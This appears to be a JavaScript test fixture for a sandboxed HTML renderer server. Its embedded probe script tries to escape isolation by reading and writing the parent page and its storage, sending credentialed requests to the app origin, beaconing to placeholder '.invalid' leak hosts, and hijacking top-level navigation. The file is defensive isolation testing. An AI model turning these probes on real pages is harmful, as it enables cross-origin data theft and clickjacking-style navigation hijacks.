import { createRendererServer } from '../dist/server.js';

const shareId = `shr_${'d'.repeat(22)}`;
const secret = 's'.repeat(43);
const authoredHtml = `<!doctype html><html><head><title>Isolated artifact</title></head><body>
  <h1>Rendered idea</h1>
  <script>
    const probe = { origin: self.origin, parentReadable: false, parentStorage: false, popupOpened: false, topNavigationAssigned: false, fetchAttempted: false, xhrAttempted: false, imageAttempted: false };
    try { parent.document.body.dataset.rendererLeak = 'true'; probe.parentReadable = true; } catch {}
    try { parent.localStorage.setItem('renderer-canary', 'leaked'); probe.parentStorage = true; } catch {}
    fetch('https://connect-canary.invalid/leak').catch(() => {});
    probe.fetchAttempted = true;
    fetch('http://127.0.0.1:43873/api/v1/renderer-canary', { credentials: 'include' }).catch(() => {});
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://127.0.0.1:43873/api/v1/renderer-canary');
    xhr.withCredentials = true;
    try { xhr.send(); } catch {}
    probe.xhrAttempted = true;
    const image = new Image(); image.src = 'https://image-canary.invalid/leak';
    probe.imageAttempted = true;
    probe.popupOpened = window.open('https://popup-canary.invalid/leak') !== null;
    try { top.location = 'https://top-canary.invalid/leak'; probe.topNavigationAssigned = true; } catch {}
    parent.postMessage({ type: 'shelf:test-boundary', probe }, '*');
    addEventListener('load', () => {
      setTimeout(() => { location.href = 'https://navigation-canary.invalid/leak'; }, 25);
    }, { once: true });
  </script>
</body></html>`;

const server = await createRendererServer({
  appOrigin: 'http://127.0.0.1:43873',
  host: '127.0.0.1',
  port: 43874,
  resolver: {
    async resolveHtml(request) {
      return request.shareId === shareId && request.secret === secret
        ? { status: 'available', html: authoredHtml }
        : { status: 'unavailable' };
    },
  },
});

await server.start();

async function stop() {
  await server.close();
  process.exitCode = 0;
}

process.once('SIGINT', () => void stop());
process.once('SIGTERM', () => void stop());
